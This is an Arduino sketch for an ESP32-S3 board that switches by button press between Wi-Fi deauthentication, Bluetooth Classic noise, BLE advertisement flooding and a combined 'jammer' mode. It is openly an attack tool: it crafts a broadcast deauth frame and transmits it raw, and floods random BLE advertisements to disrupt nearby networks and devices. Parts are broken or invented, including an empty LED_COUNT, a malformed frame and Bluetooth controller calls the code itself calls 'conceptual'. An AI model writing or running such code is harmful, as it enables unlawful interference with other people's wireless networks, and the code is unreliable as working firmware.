#include <Arduino.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Adafruit_NeoPixel.h>
#define BOOT_PIN 0
#define LED_PIN 48
#define LED_COUNT 
#define MODE_IDLE 0
#define MODE_WIFI_JAM 1
#define MODE_BT_CLASSIC_JAM 2
#define MODE_BLE_JAM 3
#define MODE_COMBO_JAM 4

// Global Variables
uint8_t currentMode = MODE_IDLE;
bool bootPressed = false;
unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 50;

// NeoPixel Setup
Adafruit_NeoPixel strip(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

// WiFi Jammer Variables
const char* wifiChannels[] = {"1", "6", "11"};
int currentWiFiChannel = 0;
unsigned long lastWiFiChange = 0;
const long wifiChangeInterval = 100;

// BLE Jammer Variables
BLEAdvertising *pAdvertising;
unsigned long lastBLEChange = 0;
const long bleChangeInterval = 50;

// BT Classic Jammer Variables
uint8_t btClassicChannels[] = {0, 24, 78}; // Common BT channels
int currentBTChannel = 0;
unsigned long lastBTChange = 0;
const long btChangeInterval = 100;

void setup() {
  Serial.begin(115200);
  pinMode(BOOT_PIN, INPUT_PULLUP);

  // Initialize NeoPixel
  strip.begin();
  strip.show();
  setLED(0, 0, 0); // Off

  // Initial mode
  setMode(MODE_IDLE);
}

void loop() {
  // Handle boot button press with debounce
  int reading = digitalRead(BOOT_PIN);
  if (reading == LOW && !bootPressed) {
    if ((millis() - lastDebounceTime) > debounceDelay) {
      bootPressed = true;
      lastDebounceTime = millis();
      changeMode();
    }
  } else if (reading == HIGH) {
    bootPressed = false;
  }

  // Execute current mode
  switch(currentMode) {
    case MODE_WIFI_JAM:
      wifiJammer();
      break;
    case MODE_BT_CLASSIC_JAM:
      btClassicJammer();
      break;
    case MODE_BLE_JAM:
      bleJammer();
      break;
    case MODE_COMBO_JAM:
      comboJammer();
      break;
    default:
      idleMode();
      break;
  }
}

void changeMode() {
  currentMode++;
  if (currentMode > MODE_COMBO_JAM) {
    currentMode = MODE_IDLE;
  }
  setMode(currentMode);
}

void setMode(uint8_t mode) {
  // Stop all previous activities
  WiFi.mode(WIFI_OFF);
  if (pAdvertising) {
    pAdvertising->stop();
  }
  BLEDevice::deinit();

  // Set LED color based on mode
  switch(mode) {
    case MODE_IDLE:
      setLED(0, 0, 255); // Blue
      break;
    case MODE_WIFI_JAM:
      setLED(255, 0, 0); // Red
      WiFi.mode(WIFI_STA);
      break;
    case MODE_BT_CLASSIC_JAM:
      setLED(0, 255, 0); // Green
      break;
    case MODE_BLE_JAM:
      setLED(255, 0, 255); // Purple
      BLEDevice::init("JAMMER");
      pAdvertising = BLEDevice::getAdvertising();
      break;
    case MODE_COMBO_JAM:
      setLED(255, 255, 0); // Yellow
      WiFi.mode(WIFI_STA);
      BLEDevice::init("JAMMER");
      pAdvertising = BLEDevice::getAdvertising();
      break;
  }
}

void setLED(uint8_t r, uint8_t g, uint8_t b) {
  strip.setPixelColor(0, strip.Color(r, g, b));
  strip.show();
}

void idleMode() {
  // Do nothing, just wait
  delay(100);
}

void wifiJammer() {
  if (millis() - lastWiFiChange > wifiChangeInterval) {
    lastWiFiChange = millis();

    // Switch WiFi channel
    currentWiFiChannel = (currentWiFiChannel + 1) % 3;
    char channel[3];
    strcpy(channel, wifiChannels[currentWiFiChannel]);

    // Set WiFi channel and send deauth packets
    esp_wifi_set_channel(atoi(channel), WIFI_SECOND_CHAN_NONE);

    // Send deauth packets to all networks
    uint8_t deauthPacket[] = {
      0xC0, 0x00, 0x3A, 0x01,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00
    };

    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  }
}

void btClassicJammer() {
  if (millis() - lastBTChange > btChangeInterval) {
    lastBTChange = millis();

    // Switch BT channel
    currentBTChannel = (currentBTChannel + 1) % 3;

    // Generate random noise on current BT channel
    uint8_t noisePacket[68];
    for (int i = 0; i < sizeof(noisePacket); i++) {
      noisePacket[i] = random(256);
    }

    // Send noise packet (ESP32-S3 has limited BT classic support, this is conceptual)
    esp_bt_controller_set_channel(btClassicChannels[currentBTChannel]);
    esp_bt_controller_send(noisePacket, sizeof(noisePacket));
  }
}

void bleJammer() {
  if (millis() - lastBLEChange > bleChangeInterval) {
    lastBLEChange = millis();

    // Generate random BLE advertisement
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    oAdvertisementData.setFlags(0x06);
    oAdvertisementData.setName("JAMMER");

    uint8_t randomData[31];
    for (int i = 0; i < sizeof(randomData); i++) {
      randomData[i] = random(256);
    }
    oAdvertisementData.setServiceData(BLEUUID("0000180A-0000-1000-8000-00805F9B34FB"), std::string((char*)randomData, sizeof(randomData)));

    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();
  }
}

void comboJammer() {
  wifiJammer();
  bleJammer();
  // Note: BT Classic jamming is omitted in combo mode due to ESP32-S3 limitations
}
